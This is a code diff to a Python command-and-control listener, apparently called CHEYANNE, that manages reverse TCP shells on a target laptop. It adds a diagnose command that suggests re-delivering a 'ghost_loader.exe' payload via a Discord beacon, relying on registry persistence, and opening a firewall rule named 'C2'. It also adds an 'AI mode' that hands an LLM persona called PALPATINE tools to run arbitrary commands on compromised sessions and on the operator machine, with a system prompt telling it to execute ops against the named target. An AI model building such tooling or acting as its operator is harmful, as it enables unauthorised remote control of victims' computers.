@@ -389,6 +389,92 @@ def launch_watch(sid: str):
     webbrowser.open("http://localhost:8892")
 
 
+# ── tcp diagnostic ───────────────────────────────────────────────────────────
+def _diagnose():
+    print(f"\n  {CYN}[DIAGNOSE] Running TCP session check...{RST}\n")
+
+    # 1 — session summary
+    with _lock:
+        total   = len(sessions)
+        shells  = sum(1 for s in sessions.values() if s["active"])
+        beacons = 0  # listener.py only handles TCP — discord beacons live elsewhere
+
+    print(f"  Sessions : {GRN}{total}{RST} total  |  {GRN}{shells}{RST} active TCP shells")
+
+    # 2 — confirm port is bound (we're inside the listener so it must be, but sanity check)
+    try:
+        result = subprocess.run(
+            ["powershell", "-c", f"netstat -ano | findstr :{LISTEN_PORT}"],
+            capture_output=True, text=True, timeout=5
+        )
+        lines = [l for l in result.stdout.splitlines() if "LISTENING" in l]
+        if lines:
+            pid_match = __import__("re").search(r"\s+(\d+)$", lines[0].strip())
+            pid = pid_match.group(1) if pid_match else "?"
+            print(f"  Port {LISTEN_PORT} : {GRN}BOUND{RST} (PID {pid} — this process)")
+        else:
+            print(f"  Port {LISTEN_PORT} : {RED}NOT FOUND in netstat — listener may be misconfigured{RST}")
+    except Exception as e:
+        print(f"  Port check  : {AMB}skipped ({e}){RST}")
+
+    # 3 — firewall check
+    try:
+        fw = subprocess.run(
+            ["powershell", "-c",
+             f"(Get-NetFirewallRule | Where-Object {{$_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound'}} | "
+             f"Get-NetFirewallPortFilter | Where-Object {{$_.LocalPort -eq '{LISTEN_PORT}'}}).Count"],
+            capture_output=True, text=True, timeout=6
+        )
+        count = fw.stdout.strip()
+        if count and int(count) > 0:
+            print(f"  Firewall    : {GRN}rule exists ({count} inbound rule(s) for {LISTEN_PORT}){RST}")
+        else:
+            print(f"  Firewall    : {AMB}NO inbound rule for {LISTEN_PORT} — Windows Firewall may be blocking callbacks{RST}")
+    except Exception:
+        print(f"  Firewall    : {DIM}check skipped{RST}")
+
+    # 4 — LAN IP
+    try:
+        lan_ip = socket.gethostbyname(socket.gethostname())
+        print(f"  LAN IP      : {WHT}{lan_ip}{RST}")
+    except Exception:
+        lan_ip = "unknown"
+        print(f"  LAN IP      : {DIM}unknown{RST}")
+
+    # 5 — verdict + options
+    print()
+    if shells == 0:
+        print(f"  {AMB}[!] Zero active TCP shells. Root cause options:{RST}\n")
+        print(f"  {GRN}A){RST} Payload not running yet — re-deliver via Discord beacon:")
+        print(f"     {DIM}interact <discord-sid>  →  C:\\Users\\Public\\ghost_loader.exe{RST}")
+        print(f"  {GRN}B){RST} Registry persistence set but target hasn't logged in/out yet")
+        print(f"     {DIM}wait for Radon_Laptop1 relogin OR use option A to force-run now{RST}")
+        print(f"  {GRN}C){RST} Firewall blocking inbound {LISTEN_PORT} — add rule:")
+        print(f"     {DIM}netsh advfirewall firewall add rule name=\"C2\" dir=in action=allow protocol=TCP localport={LISTEN_PORT}{RST}")
+    else:
+        print(f"  {GRN}[+] {shells} active shell(s). All good.{RST}")
+
+    # trailing PALPATINE prompt — copy/paste to AI
+    print(f"  {DIM}{'─'*60}{RST}")
+    print(f"  {CYN}[PALPATINE PROMPT]{RST} paste this to your AI:\n")
+    if shells == 0:
+        active_sids = [sid for sid, s in sessions.items() if s["active"]]
+        sid_str = active_sids[0] if active_sids else "<no active sessions>"
+        print(f"  CHEYANNE diagnose report:")
+        print(f"  - TCP shells: 0  |  Listener: BOUND on {lan_ip}:{LISTEN_PORT}")
+        print(f"  - Active session IDs: {', '.join(active_sids) if active_sids else 'none'}")
+        print(f"  - Options A/B/C shown. Awaiting instruction.")
+        print(f"  What do I do next? Run the tool.")
+    else:
+        sids = [sid for sid, s in sessions.items() if s["active"]]
+        print(f"  CHEYANNE diagnose report:")
+        print(f"  - TCP shells: {shells}  |  Session IDs: {', '.join(sids)}")
+        print(f"  - Listener: BOUND on {lan_ip}:{LISTEN_PORT}")
+        print(f"  All good. Which session to interact with?")
+    print(f"  {DIM}{'─'*60}{RST}")
+    print()
+
+
 # ── main command loop ─────────────────────────────────────────────────────────
 def cmd_loop():
     print_banner()
@@ -419,6 +505,7 @@ def cmd_loop():
   {GRN}watch <id>{RST}            VNC browser viewer (:8892)
   {GRN}screenshot <id>{RST}       one screenshot → downloads/
   {GRN}shell <id> <cmd>{RST}      run single command
+  {GRN}diagnose{RST}              TCP session health check + options
   {GRN}log{RST}                   tail PENTEST_LOG.md
   {GRN}exit{RST}                  shut down listener
 """)
@@ -470,6 +557,9 @@ def cmd_loop():
             print(out)
             log_event(f"SHELL → {parts[1]}: {parts[2]}\n{out}")
 
+        elif cmd == "diagnose":
+            _diagnose()
+
         elif cmd == "log":
             try:
                 with open(LOG_FILE, "r", encoding="utf-8") as f:
@@ -513,6 +603,174 @@ def magic_trigger_loop(host: str = "0.0.0.0", port: int = MAGIC_PORT):
             print(f"  {RED}[!] MAGIC send failed: {e}{RST}")
 
 
+# ── ai mode (Kimi tool loop, no Discord) ─────────────────────────────────────
+_AI_TOOLS = [
+    {"type": "function", "function": {
+        "name": "list_sessions",
+        "description": "List all active TCP shell sessions",
+        "parameters": {"type": "object", "properties": {}}
+    }},
+    {"type": "function", "function": {
+        "name": "run_shell_cmd",
+        "description": "Run a command on an active TCP session and return output",
+        "parameters": {"type": "object", "properties": {
+            "session_id": {"type": "string", "description": "8-char session ID"},
+            "command":    {"type": "string", "description": "Command to run on target"}
+        }, "required": ["session_id", "command"]}
+    }},
+    {"type": "function", "function": {
+        "name": "diagnose_tcp",
+        "description": "Run full TCP diagnostic — port check, session count, firewall, options",
+        "parameters": {"type": "object", "properties": {}}
+    }},
+    {"type": "function", "function": {
+        "name": "run_local_cmd",
+        "description": "Run a PowerShell command on the operator machine",
+        "parameters": {"type": "object", "properties": {
+            "command": {"type": "string", "description": "PowerShell command"}
+        }, "required": ["command"]}
+    }},
+]
+
+
+def _ai_tool_exec(name, args):
+    if name == "list_sessions":
+        with _lock:
+            if not sessions:
+                return "No active sessions."
+            lines = []
+            for sid, s in sessions.items():
+                ago = int(time.time() - s["last_seen"])
+                lines.append(f"{sid}  {s['user']}@{s['host']}  {s['addr'][0]}  {ago}s ago  {'ACTIVE' if s['active'] else 'DEAD'}")
+        return "\n".join(lines)
+
+    elif name == "run_shell_cmd":
+        out = send_cmd(args["session_id"], args["command"], timeout=12.0)
+        log_event(f"AI CMD → {args['session_id']}: {args['command']}\n{out}")
+        return out or "(no output)"
+
+    elif name == "diagnose_tcp":
+        import io, contextlib
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            _diagnose()
+        return buf.getvalue()
+
+    elif name == "run_local_cmd":
+        r = subprocess.run(
+            ["powershell", "-c", args["command"]],
+            capture_output=True, text=True, timeout=30
+        )
+        return (r.stdout or "") + (r.stderr or "")
+
+    return f"Unknown tool: {name}"
+
+
+def ai_cmd_loop():
+    try:
+        from openai import OpenAI
+    except ImportError:
+        print(f"  {RED}[!] openai package not installed: pip install openai{RST}")
+        return
+
+    import os as _os
+    api_key = _os.getenv("OPENROUTER_API_KEY") or _os.getenv("KIMI_API_KEY")
+    if not api_key:
+        print(f"  {RED}[!] Set OPENROUTER_API_KEY or KIMI_API_KEY in environment{RST}")
+        return
+
+    kimi = OpenAI(api_key=api_key, base_url="https://openrouter.ai/api/v1")
+    model = "moonshotai/kimi-k2.5"
+
+    sys_prompt = (
+        "You are PALPATINE, AI operator for CHEYANNE C2 framework. "
+        "You have tool access to TCP sessions and the operator machine. "
+        "Use tools to answer questions and execute ops. Be concise. "
+        "Operator machine: 192.168.1.92. Target: Radon_Laptop1 (192.168.1.145). "
+        "Always use run_shell_cmd to execute commands on sessions. "
+        "Always use diagnose_tcp when operator reports TCP issues. "
+        "When you find active sessions, report the session ID and suggest interacting."
+    )
+
+    messages = [{"role": "system", "content": sys_prompt}]
+
+    print_banner()
+    print(f"  {CYN}[AI MODE]{RST} PALPATINE online — Kimi K2.5 via OpenRouter")
+    print(f"  {DIM}Type natural language. 'back' to return to standard mode. 'exit' to quit.{RST}\n")
+
+    while True:
+        try:
+            user_input = input(f"{GRN}vader>{RST} ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            break
+        if not user_input:
+            continue
+        if user_input.lower() in ("exit", "quit"):
+            break
+        if user_input.lower() == "back":
+            print(f"  {DIM}Returning to standard mode...{RST}")
+            cmd_loop()
+            break
+
+        messages.append({"role": "user", "content": user_input})
+
+        while True:
+            resp = kimi.chat.completions.create(
+                model=model,
+                messages=messages,
+                tools=_AI_TOOLS,
+                tool_choice="auto",
+                max_tokens=1024,
+            )
+            msg = resp.choices[0].message
+            messages.append(msg)
+
+            if msg.tool_calls:
+                for tc in msg.tool_calls:
+                    import json as _json
+                    args = _json.loads(tc.function.arguments or "{}")
+                    print(f"  {CYN}[TOOL]{RST} {tc.function.name}({', '.join(f'{k}={v!r}' for k,v in args.items())})")
+                    result = _ai_tool_exec(tc.function.name, args)
+                    print(f"  {DIM}{result[:300]}{RST}")
+                    messages.append({
+                        "role": "tool",
+                        "tool_call_id": tc.id,
+                        "content": result
+                    })
+            else:
+                print(f"\n  {WHT}{msg.content}{RST}\n")
+                break
+
+
+# ── startup helpers ──────────────────────────────────────────────────────────
+def _kill_port(port):
+    """Kill any existing process bound to port before we try to bind."""
+    try:
+        r = subprocess.run(
+            ["powershell", "-c", f"netstat -ano | findstr :{port}"],
+            capture_output=True, text=True, timeout=5
+        )
+        pids = set()
+        for line in r.stdout.splitlines():
+            if f":{port}" in line and "LISTENING" in line:
+                parts = line.strip().split()
+                if parts:
+                    pids.add(parts[-1])
+        for pid in pids:
+            try:
+                subprocess.run(["taskkill", "/PID", pid, "/F"],
+                               capture_output=True, timeout=5)
+                print(f"  {AMB}[~] Killed stale listener PID {pid} on :{port}{RST}")
+                log_event(f"AUTO-KILL: PID {pid} on :{port}")
+            except Exception:
+                pass
+        if pids:
+            import time as _t; _t.sleep(0.5)
+    except Exception:
+        pass
+
+
 # ── entry ────────────────────────────────────────────────────────────────────
 def main():
     import argparse
@@ -522,7 +780,11 @@ def main():
     parser.add_argument("--magic", action="store_true",
                         help=f"Also start ghost_iron ISUN trigger on port {MAGIC_PORT}")
     parser.add_argument("--magic-port", type=int, default=MAGIC_PORT, dest="magic_port")
+    parser.add_argument("--ai", action="store_true",
+                        help="AI mode — Kimi K2.5 operator brain with tool use (no Discord)")
     args = parser.parse_args()
+
+    _kill_port(args.port)
 
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -547,7 +809,10 @@ def main():
         threading.Thread(target=magic_trigger_loop,
                          args=(args.host, args.magic_port), daemon=True).start()
 
-    cmd_loop()
+    if args.ai:
+        ai_cmd_loop()
+    else:
+        cmd_loop()
     srv.close()
 
 
